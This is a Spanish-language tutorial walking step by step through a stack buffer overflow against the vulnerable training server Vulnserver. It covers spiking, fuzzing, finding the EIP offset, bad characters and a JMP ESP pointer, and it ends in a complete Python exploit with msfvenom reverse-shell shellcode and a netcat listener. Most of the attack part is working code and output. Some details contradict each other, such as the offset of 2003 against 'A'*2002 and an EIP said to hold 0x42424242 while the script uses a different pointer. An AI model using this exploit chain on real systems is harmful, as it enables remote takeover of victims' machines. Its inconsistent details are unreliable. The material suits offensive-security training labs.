<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">5. Spiking.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

- Antes de comenzar con el proceso de spiking, es importante realizar algunos pasos de preparación. Primero, se debe **desactivar la protección en tiempo real de Windows Defender**, ya que este podría bloquear el servidor vulnerable **Voland Server** cuando se intenten ejecutar exploits o acciones maliciosas.

- Además, es necesario que **Immunity Debugger** y **Voland Server** se ejecuten como administrador. Esto es esencial, ya que si no se ejecutan con privilegios de administrador, **Immunity Debugger** no podrá detectar que **Voland Server** está en ejecución y no se podrá acceder al mismo. Además, ejecutar **Voland Server** como administrador también asegurará que, cuando se obtenga un shell inverso, se obtengan permisos de **root** automáticamente, lo que facilitará el proceso.

### Ejecución de Voland Server e Immunity Debugger

- Una vez que ambos programas estén configurados, es hora de ejecutar **Voland Server**. Después de haber extraído el archivo en una carpeta, simplemente se debe hacer clic derecho sobre el archivo ejecutable y seleccionar "*Ejecutar como administrador*". Cuando el servidor esté en funcionamiento, deberá verse una ventana de consola indicando que está listo.

- Luego, se debe iniciar **Immunity Debugger** también como administrador. Dentro de **Immunity**, se debe seleccionar **File > Attach**, buscar el proceso de **Voland Server**, y adjuntarlo. En la esquina inferior derecha, debería aparecer "**paused**". Simplemente se debe presionar el botón de "**play**" para que aparezca el estado de "**running**". Si todo está en orden, ambos programas estarán funcionando y listos para las siguientes etapas.

### Proceso de Spiking

- El spiking es un método que se utiliza para identificar partes vulnerables en un programa. El objetivo es enviar grandes cantidades de datos a un comando específico y ver si se produce un desbordamiento del búfer, lo que resultaría en un fallo o un bloqueo del programa. Si el programa falla, se identifica esa parte como vulnerable. Si no, se pasa al siguiente comando.

- En este caso, el servidor vulnerable escucha en el puerto **9999**, y los comandos válidos se pueden ver escribiendo **HELP** una vez conectado al servidor usando **Netcat**. Entre los comandos listados, el comando **TRUN** será el foco, ya que es vulnerable a un desbordamiento de búfer.

### Conexión con Netcat

En la máquina Kali Linux, se puede usar **Netcat** para conectarse a **Voland Server**. El comando sería el siguiente:

```bash
nc IP_del_servidor_Windows 9999
```

- Una vez conectado, se puede ingresar el comando **HELP** para ver la lista de comandos válidos. La idea detrás del spiking es tomar uno de estos comandos, en este caso **TRUN**, y enviarle grandes cantidades de datos para ver si ocurre un desbordamiento.

### Uso de Herramientas de Spiking

Para realizar spiking, se utilizará la herramienta **Generic Send TCP**. Esta herramienta permite enviar datos aleatorios de diferentes tamaños a un programa para ver si ocurre un fallo. Aquí está la estructura básica del comando:

```bash
generic_send_tcp <host> <puerto> <script_spike> 0 0
```

- Un **script de spike** debe ser creado para cada comando que se desee probar. Un ejemplo de script para el comando **STATS** podría verse así:

```bash
s_readline();
s_string("STATS ");
s_string_variable("0");
```

- Esto indica que se va a enviar el comando STATS seguido de una serie de datos aleatorios al servidor. El mismo proceso se aplicará al comando TRUN:

```bash
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

- Se debe guardar cada script con un nombre descriptivo, como **stats.spk** o **trun.spk**. Luego, se ejecuta **Generic Send TCP** con los parámetros adecuados para enviar los datos.

```bash
generic_send_tcp 10.0.2.15 9999 trun.spk 0 0
...
Fuzzing Variable 0:68
Variablesize= 1024
Fuzzing Variable 0:69
Variablesize= 1023
Fuzzing Variable 0:70
Variablesize= 512
```

- Si el programa es vulnerable, el `vulnserver` se detendrá.

### Siguiente Paso

En la siguiente sección, se profundizará en el proceso de **fuzzing**, que es una técnica similar al spiking, pero automatizando la generación de grandes volúmenes de datos. Se creará un script en **Python** para realizar fuzzing en el comando **TRUN** y continuar con el análisis del desbordamiento de búfer.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">6. Fuzing.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

El **fuzzing** es muy similar al proceso de **spiking** en el sentido de que se envían muchos caracteres a un comando específico con la intención de hacer que falle. La diferencia es que mientras que en el spiking se prueban múltiples comandos para encontrar cuál es vulnerable, en el fuzzing ya se sabe qué comando es vulnerable, en este caso el comando **TRUN**, y se procede a atacar ese comando de manera específica.

### Preparación

Antes de empezar con el fuzzing, se deben seguir los siguientes pasos de preparación:

1. Ejecutar **Immunity Debugger** con privilegios de administrador.
2. Ejecutar **Voland Server** también como administrador.

Si en algún momento **Voland Server** se bloquea o se cierra debido al fuzzing, es recomendable reiniciar tanto **Immunity Debugger** como **Voland Server**, y volver a adjuntar el proceso en **Immunity Debugger**.

### Desarrollo del Fuzzing

Para realizar el fuzzing, se ha construido un **script en Python**. El objetivo de este script es enviar grandes cantidades de datos al comando **TRUN** para identificar en qué punto se produce un fallo en el servidor.

### Explicación del Script

El script en Python es el siguiente:

```python
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100
ip_address = '192.168.0.12'

while True:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address,9999))
        s.send(('TRUN /.:/' + buffer).encode(`utf-8`))
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100
    except:
        print("Fuzzing crash en %s bytes " % str(len(buffer)) )
        sys.exit()
```

Este script sigue el siguiente proceso:

1. Se importan los módulos necesarios: **sys**, **socket** (para la conexión) y **sleep** (para añadir pausas entre envíos).
2. Se declara una variable llamada **buffer**, que inicialmente contiene 100 letras "**A**".
3. El script entra en un bucle **while True**, en el que intenta:
- Conectar al servidor vulnerado en la IP y puerto adecuados (9999 para **Voland Server**).
- Enviar el comando vulnerable **TRUN** seguido de un buffer de caracteres "**A**".
- Cerrar la conexión y dormir por un segundo antes de aumentar el tamaño del buffer en 100 caracteres.
- Continuar este proceso hasta que el servidor falle, lo que indicará que se ha producido un desbordamiento de búfer.
4. Cuando el servidor falla, el script imprime el tamaño del buffer que causó el fallo y se cierra.

### Ejecución del Script

Una vez guardado el script en un archivo (por ejemplo, `fuzzing.py`), se le deben otorgar permisos de ejecución con el siguiente comando en **Kali Linux**:

```bash
chmod +x fuzzing.py
```

Luego, se ejecuta el script:

```bash
./fuzzing.py
```

En este punto, Voland Server comenzará a recibir conexiones y datos en incrementos de 100 bytes. El servidor debería fallar rápidamente, y se observará que el programa se detiene en Immunity Debugger.

### Análisis del Resultado

- Después de que se produce el fallo, Immunity Debugger mostrará un mensaje de violación de acceso (access violation). Al revisar los registros, se puede notar que el registro EIP no ha sido sobrescrito, pero lo importante es saber aproximadamente cuántos bytes fueron necesarios para hacer que el servidor falle.

- Por ejemplo, si el programa falla con alrededor de 3000 bytes, esto proporciona un punto de referencia para el siguiente paso, que es encontrar el offset exacto donde se sobrescribe el EIP.

### Siguiente Paso

En la siguiente sección, se cubrirá el proceso de encontrar el offset exacto para sobrescribir el EIP. Esto se logrará utilizando un patrón cíclico de caracteres, que permitirá identificar en qué parte del buffer se encuentra el EIP. Una vez que se tenga control sobre el EIP, se podrá redirigir el flujo del programa hacia un código malicioso.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">7. Encontrando el Offset.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />


Una vez que se ha identificado el punto de fallo aproximado a través del fuzzing, el siguiente paso en un ataque de desbordamiento de búfer es encontrar el **offset** exacto donde se sobrescribe el registro **EIP**. El **EIP** es el registro que indica la próxima instrucción a ejecutar en un programa, y poder controlarlo es esencial para ejecutar un exploit exitoso.

### Uso de pattern_create para encontrar el Offset

En esta etapa, se emplea una herramienta incluida en el framework de **Metasploit** llamada pattern_create. Esta herramienta genera un patrón único y cíclico de bytes, lo que nos permite identificar exactamente en qué punto se sobrescribe el **EIP** cuando se produce un fallo.

### Creación del Patrón

Primero, se debe generar un patrón cíclico de aproximadamente **3000 bytes**, ya que en el fuzzing previo se identificó que el servidor vulnerable colapsaba con buffers de alrededor de **2700 bytes**. Para esto, ejecutamos el siguiente comando en la terminal de **Kali Linux**:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

Este comando generará un patrón de 3000 bytes, que será utilizado para identificar el offset exacto.

### Envío del Patrón

Una vez que se ha generado el patrón, se debe modificar el script Python que anteriormente se utilizó en el fuzzing para que envíe este patrón en lugar de los caracteres repetitivos. A continuación se muestra un ejemplo de cómo realizar esto:

```python
#!/usr/bin/python
import sys, socket
from time import sleep

#buffer = "A" * 3000  # Reemplazar con el patrón generado
buffer = "reemplazar con el patrón generado por pattern_create"
ip_address = 'reemplazar por la ip address del target'

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 9999))
    s.send(('TRUN /.:/' + buffer).encode('utf-8'))
    s.close()
except:
    print("Error al conectar con el servidor")
    sys.exit()

```

### Ejecución y Análisis

Después de enviar el patrón, el programa vulnerable debería colapsar de nuevo. En este punto, se debe abrir **Immunity Debugger** y observar el valor en el registro **EIP**. Este valor es crucial, ya que nos indica el punto exacto en el que el buffer sobrescribe el **EIP**. Un ejemplo de valor del **EIP** podría ser 386F4337.

### Cálculo del Offset

Con el valor del **EIP** identificado, el siguiente paso es utilizar la herramienta pattern_offset para encontrar el offset exacto dentro de los 3000 bytes generados. Esto se logra ejecutando el siguiente comando en **Kali Linux**:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337 -l 3000
[*] Exact match at offset 2003
```

Este comando devuelve el offset exacto en el que el patrón sobrescribe el **EIP**. Supongamos que el resultado es 2003. Esto indica que después de 2003 bytes, se sobrescribe el **EIP**.

### Próximos Pasos

Una vez identificado el offset, en el siguiente paso se procede a sobrescribir el **EIP** con valores específicos y redirigir el flujo de ejecución a un shellcode malicioso, que permitirá la ejecución de código arbitrario.

Este proceso es fundamental para explotar la vulnerabilidad y tomar control del sistema vulnerable.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">8. Sobrescribiendo el EIP.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />


Después de haber identificado con precisión el **offset** en 2003 bytes en el paso anterior, el siguiente objetivo es sobrescribir el **EIP** (Puntero de Instrucción) con un valor controlado. Esto es crucial, ya que una vez que se controla el **EIP**, se puede redirigir el flujo del programa hacia cualquier dirección de memoria, lo que permite la ejecución de código malicioso.

### Comprendiendo el Proceso

Sabemos que el **offset** está en 2003 bytes, lo que significa que hay 2003 bytes que preceden al **EIP**. El **EIP** en sí ocupa 4 bytes, por lo que sobrescribir estos cuatro bytes es clave para tomar el control.

### Modificación del Script

Primero, es necesario modificar el script que se utilizó previamente para encontrar el offset. En este caso, se reemplaza el código que se utilizó para calcular el offset con un payload que contenga los datos para sobrescribir el **EIP**. El proceso consiste en lo siguiente:

1. Abrir el script anterior en un editor de texto, como **gedit**.
2. Eliminar la variable de offset utilizada previamente, ya que ahora se procederá a enviar datos controlados directamente para sobrescribir el **EIP**.
3. En lugar del offset, se utilizará un código que envía **2003 bytes** de "**A**" seguidos de **4 bytes** de "**B**". Esto se hace para verificar que el **EIP** se sobrescribe correctamente con los valores deseados. En términos de bytes, las "**A**" representan el valor **0x41** y las "**B**" el valor **0x42**.

El código modificado debería verse así:

```python
import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4  # caracter "A" 2003 veces seguido de 4 caracters "B"
ip_address = '192.168.0.12'

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 9999))
    s.send(('TRUN /.:/' + shellcode).encode('utf-8'))
    s.close()
except:
    print("Error al conectar con el servidor")
    sys.exit()
```

### Ejecución y Verificación

Una vez guardado el script, se puede ejecutar de la misma manera que antes. Con **Immunity Debugger** corriendo y adjuntado al servidor vulnerable, el programa se debería detener debido a una violación de acceso. Al revisar los registros en **Immunity**, el **EIP** debería haber sido sobrescrito con **42424242** (el valor hexadecimal de las "**B**"), confirmando que se ha tomado control del **EIP**.

### Análisis del Resultado

Al observar el valor **42424242** en el registro **EIP**, se puede concluir que se ha sobrescrito correctamente. Esto indica que se ha logrado el control del flujo del programa. A partir de aquí, el siguiente paso será utilizar esta capacidad para redirigir la ejecución del programa hacia un código malicioso (shellcode), lo que permitirá la ejecución remota de código.

### Próximos Pasos

Con el control del EIP ya en manos del atacante, los pasos siguientes consisten en:

1. Identificar caracteres malos: Limpiar el payload de cualquier carácter que pueda causar errores o interrupciones en la ejecución.
2. Encontrar el módulo correcto: Identificar un módulo seguro en la memoria para ejecutar el shellcode.
3. Generar shellcode: Crear un shellcode malicioso que permita obtener acceso al sistema o ejecutar comandos arbitrarios.

En resumen, controlar el EIP es un hito importante en un ataque de desbordamiento de búfer, y este proceso prepara el terreno para la explotación total del sistema.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">9. Identificando Caracteres Malos.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />


En esta sección, se aborda el **concepto de caracteres** malos en relación con la generación de **shellcode**. Al generar shellcode, es crucial identificar qué caracteres son seguros y cuáles pueden causar problemas durante la inyección de código. Estos caracteres "malos" son aquellos que, al estar presentes en el shellcode, pueden provocar comportamientos inesperados o interrumpir su ejecución.

### ¿Qué son los caracteres malos?

Un **carácter malo** es cualquier valor hexadecimal que podría interferir con el flujo del programa o el shellcode, ya sea porque tiene un significado especial para el programa o porque afecta cómo se procesan los datos. Por defecto, el primer carácter malo conocido es el **byte nulo (\x00)**, ya que este marca el final de una cadena en muchos lenguajes de programación. Además del byte nulo, cada programa puede tener otros caracteres que interfieran con la ejecución del shellcode.

Link con `badchars`: [Link](https://github.com/cytopia/badchars)

### Proceso para identificar caracteres malos

El procedimiento para identificar estos caracteres implica pasar todos los valores hexadecimales posibles (de **0x01** a **0xFF**) a través del programa para observar si alguno causa problemas.

### Modificación del Script

Para comenzar, es necesario modificar el script que sobrescribió el **EIP** en la etapa anterior, agregando una secuencia de todos los caracteres hexadecimales posibles (exceptuando el byte nulo, que se conoce como problemático). Esta secuencia se añadirá después de los bytes que sobrescriben el **EIP**.

El script modificado debería verse así:

```python
#!/usr/bin/python
import sys, socket
from time import sleep

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
shellcode = "A" * 2003 + "B" * 4 + badchars
ip_address = 'reemplazar por la ip del target'

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 9999))
    s.send(('TRUN /.:/' + shellcode).encode('utf-8'))
    s.close()
except:
    print("Error al conectar con el servidor")
    sys.exit()
```

### Ejecución del Script

Una vez que el script ha sido modificado, se ejecuta de la misma manera que antes, con **Immunity Debugger** corriendo y adjuntado al servidor vulnerable. Al revisar el **dump** en **Immunity**, se debe observar la secuencia de bytes enviada, comenzando desde **0x01** y continuando hasta **0xFF**.

### Análisis del Hex Dump

En **Immunity Debugger**, se puede seguir el puntero **ESP** para visualizar el volcado de memoria que contiene los caracteres enviados. Lo que se busca es identificar cualquier carácter faltante o fuera de lugar en la secuencia. Si, por ejemplo, la secuencia pasa de **0x03** a **0x05** sin incluir el **0x04**, entonces el **0x04** es un carácter malo que debe eliminarse del shellcode.

### Ejemplo de Identificación

En un escenario típico, si la secuencia de caracteres se ve así:

```
... 0x01 0x02 0x03 0xDD 0x05 0x06 ...
```

Esto indica que el **0x04** es un carácter malo. Todos los caracteres faltantes o que no se encuentren en el orden correcto deben ser anotados y excluidos al generar el shellcode.

Ejemplo:

![alt text](/assets/images/bad-characters.png)
_Figura 9. Ejemplo de bad characters._

### Importancia de la Identificación Precisa

Es fundamental identificar correctamente todos los caracteres malos. Omitir un carácter malo puede llevar a que el shellcode no se ejecute correctamente, resultando en frustración y pérdida de tiempo al intentar diagnosticar el problema. Una vez que se tiene la lista completa de caracteres malos, se debe excluir cada uno de ellos al generar el shellcode.

### Próximos Pasos

Después de identificar todos los caracteres malos, el siguiente paso será **encontrar el módulo adecuado** en la memoria para la ejecución del shellcode y, posteriormente, generar el shellcode final para completar el ataque de desbordamiento de búfer.

Este proceso asegura que el shellcode se ejecute sin interrupciones ni errores causados por caracteres conflictivos.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">10. Buscando el módulo vulnerable.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

- En este caso, vamos a ayudarnos del `mona` modules.
- Colocar el archivo `mona.py` en `C:\Program Files(x86)\Immunity Inc\Immunity Debugger\PyCommands`:
- En el Immunity Debugger, ejecutar `!mona modules` en el prompt de comandos.

![alt text](/assets/images/mona-modules.png)

- En Kali, vamos a ejecutar

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000  FFE4              jmp esp
```

- Vamos a buscar la instrucción `JMP ESP` en `mona` modules.

![alt text](/assets/images/return-addresses.png)

```bash
#pointers in little endian format                                 
pointer= "\xaf\x11\x50\x62"    #625011af
pointer= "\xbb\x11\x50\x62"    #625011bb       
pointer= "\xc7\x11\x50\x62"    #625011c7       
pointer= "\xd3\x11\x50\x62"    #625011d3       
pointer= "\xdf\x11\x50\x62"    #625011df       
pointer= "\xeb\x11\x50\x62"    #625011eb       
pointer= "\xf7\x11\x50\x62"    #625011f7       
pointer= "\x03\x12\x50\x62"    #62501203       
pointer= "\x05\x12\x50\x62"    #62501205       
```

- En Immunity Debugger, localizar, por ejemplo, el puntero `625011af`:

- Activar el Immunity Debugger con el `vulnserver`:

- Ejecutar el siguiente código:

```bash
#!/usr/bin/python
import sys, socket

#pointers					EIP
pointer= "\xaf\x11\x50\x62"	#625011af
#pointer= "\xbb\x11\x50\x62"	#625011bb	
#pointer= "\xc7\x11\x50\x62"	#625011c7	
#pointer= "\xd3\x11\x50\x62"	#625011d3	
#pointer= "\xdf\x11\x50\x62"	#625011df	
#pointer= "\xeb\x11\x50\x62"	#625011eb	
#pointer= "\xf7\x11\x50\x62"	#625011f7	
#pointer= "\x03\x12\x50\x62"	#62501203	
#pointer= "\x05\x12\x50\x62"	#62501205	62501205

#shellcode = "A"2003" + pointer
shellcode = "A"*2002 + pointer
ip_address ='192.168.0.12'

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 9999))
    s.send(('TRUN /.:/' + shellcode).encode('utf-8'))
    s.close()
except:
    print("Error al conectar con el servidor")
    sys.exit()
```

- Y en el Immunity Debugger, obtendremos el overwriting del EIPÑ

![alt text](/assets/images/eip-overwriting.png)



<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">10. Generación de Shellcode.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

En esta etapa final, el objetivo es generar el **shellcode** necesario para obtener acceso remoto a la máquina objetivo. Para lograrlo, se utiliza la herramienta **MSFvenom**, que forma parte del framework **Metasploit**, y permite crear un shell inverso que será ejecutado en la máquina vulnerable.

### Utilización de MSFvenom

**MSFvenom** es una herramienta poderosa para generar payloads (cargas útiles) con diferentes opciones y configuraciones. En este caso, se generará un **shell inverso** que permita a la máquina víctima conectarse de vuelta a la máquina atacante.

### Comando para generar shellcode

El comando para generar el shellcode se compone de varios parámetros clave:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP_ATACANTE LPORT=4444 -f c -a x86 -b "\x00"
```

* **-p windows/shell_reverse_tcp**: Este es el payload que se usará, en este caso, un shell inverso para sistemas Windows que utiliza el protocolo TCP.
* **LHOST=IP_ATACANTE**: Aquí se debe especificar la dirección IP de la máquina atacante, es decir, la máquina desde la cual se controlará el ataque.
* **LPORT=4444**: El puerto en el que se escuchará la conexión desde la máquina víctima. En este ejemplo se usa el puerto 4444, pero puede ser cualquier puerto abierto en la máquina atacante.
* **-f c**: Este parámetro indica que el formato de salida del shellcode será en lenguaje C, para facilitar su inclusión en el script de Python.
* **-a x86**: Se especifica que el shellcode debe ser compatible con una arquitectura x86.
* **-b "\x00"**: La opción -b permite excluir ciertos caracteres del shellcode. En este caso, se excluye el byte nulo (\x00), ya que este puede causar problemas en la ejecución.

### Ejecución de MSFvenom

Al ejecutar el comando anterior, MSFvenom generará el shellcode, que será una cadena de bytes en formato hexadecimal. Un ejemplo del resultado sería algo similar a lo siguiente:

```c
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52..."
```

Este código es la carga útil que se inyectará en la máquina víctima.

### Inclusión del Shellcode en el Script

Una vez generado el shellcode, se debe incluir en el script de Python que se ha estado utilizando. Para ello, se define una variable que contenga el shellcode y se añade al flujo del ataque.

```python
#!/usr/bin/python
import sys, socket

overflow = (
"\xba\x49\xb4\x42\x37\xdb\xdd\xd9\x74\x24\xf4\x5e\x2b\xc9"
"\xb1\x52\x31\x56\x12\x03\x56\x12\x83\xa7\x48\xa0\xc2\xcb"
"\x59\xa7\x2d\x33\x9a\xc8\xa4\xd6\xab\xc8\xd3\x93\x9c\xf8"
"\x90\xf1\x10\x72\xf4\xe1\xa3\xf6\xd1\x06\x03\xbc\x07\x29"
"\x94\xed\x74\x28\x16\xec\xa8\x8a\x27\x3f\xbd\xcb\x60\x22"
"\x4c\x99\x39\x28\xe3\x0d\x4d\x64\x38\xa6\x1d\x68\x38\x5b"
"\xd5\x8b\x69\xca\x6d\xd2\xa9\xed\xa2\x6e\xe0\xf5\xa7\x4b"
"\xba\x8e\x1c\x27\x3d\x46\x6d\xc8\x92\xa7\x41\x3b\xea\xe0"
"\x66\xa4\x99\x18\x95\x59\x9a\xdf\xe7\x85\x2f\xfb\x40\x4d"
"\x97\x27\x70\x82\x4e\xac\x7e\x6f\x04\xea\x62\x6e\xc9\x81"
"\x9f\xfb\xec\x45\x16\xbf\xca\x41\x72\x1b\x72\xd0\xde\xca"
"\x8b\x02\x81\xb3\x29\x49\x2c\xa7\x43\x10\x39\x04\x6e\xaa"
"\xb9\x02\xf9\xd9\x8b\x8d\x51\x75\xa0\x46\x7c\x82\xc7\x7c"
"\x38\x1c\x36\x7f\x39\x35\xfd\x2b\x69\x2d\xd4\x53\xe2\xad"
"\xd9\x81\xa5\xfd\x75\x7a\x06\xad\x35\x2a\xee\xa7\xb9\x15"
"\x0e\xc8\x13\x3e\xa5\x33\xf4\x81\x92\x3b\x0f\x6a\xe1\x3b"
"\x1e\x36\x6c\xdd\x4a\xd6\x38\x76\xe3\x4f\x61\x0c\x92\x90"
"\xbf\x69\x94\x1b\x4c\x8e\x5b\xec\x39\x9c\x0c\x1c\x74\xfe"
"\x9b\x23\xa2\x96\x40\xb1\x29\x66\x0e\xaa\xe5\x31\x47\x1c"
"\xfc\xd7\x75\x07\x56\xc5\x87\xd1\x91\x4d\x5c\x22\x1f\x4c"
"\x11\x1e\x3b\x5e\xef\x9f\x07\x0a\xbf\xc9\xd1\xe4\x79\xa0"
"\x93\x5e\xd0\x1f\x7a\x36\xa5\x53\xbd\x40\xaa\xb9\x4b\xac"
"\x1b\x14\x0a\xd3\x94\xf0\x9a\xac\xc8\x60\x64\x67\x49\x80"
"\x87\xad\xa4\x29\x1e\x24\x05\x34\xa1\x93\x4a\x41\x22\x11"
"\x33\xb6\x3a\x50\x36\xf2\xfc\x89\x4a\x6b\x69\xad\xf9\x8c"
"\xb8")

shellcode = "A"*2003 + "\xaf\x11\x50\x62" + "\x90"*32 + overflow
ip_address ='reemplazar por la ip del target'

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print("Error al conectar con el servidor")
    sys.exit()
```

### Explicación del Script

* **NOP Sled (\x90)**: Se ha añadido un NOP sled de 32 bytes. El código 0x90 es la instrucción NOP (No Operation), que simplemente crea un "colchón" en el que el shellcode puede caer de manera segura y ejecutarse sin interrupciones.
* **Sobrescribir el EIP**: El EIP sigue sobrescrito con el valor 0x42424242 (representado por las letras "B"), pero esta vez se apunta a una dirección en la memoria que ejecutará el shellcode.
* **Shellcode**: El shellcode generado por MSFvenom se inserta al final del buffer, después del NOP sled, listo para ser ejecutado cuando se tome el control del flujo del programa.

### Configuración de Netcat para Escuchar la Conexión

Antes de ejecutar el script, se debe configurar Netcat en la máquina atacante para que escuche en el puerto designado (4444 en este caso):

```bash
nc -lvnp 4444
```

Esto permitirá capturar la conexión inversa desde la máquina víctima.

### Ejecución del Ataque

Con el servidor vulnerable ejecutándose en la máquina víctima, se lanza el script Python que contiene el shellcode:

```bash
python exploit.py
```

Una vez ejecutado, si todo ha sido configurado correctamente, la máquina víctima se conectará a la máquina atacante, y se obtendrá una shell remota en Netcat.

### Verificación del Acceso

Una vez que se ha obtenido la shell, se pueden ejecutar comandos en la máquina comprometida. Por ejemplo, para verificar el acceso:

```bash
whoami
```

Esto debería devolver el nombre del usuario que ejecuta el servidor vulnerable, confirmando que el atacante ha obtenido acceso al sistema.

### Próximos Pasos

A partir de aquí, el atacante tiene acceso total a la máquina víctima y puede realizar cualquier operación que desee. Sin embargo, en entornos más protegidos, se necesitaría implementar técnicas adicionales para evadir sistemas de detección y mantener el acceso.
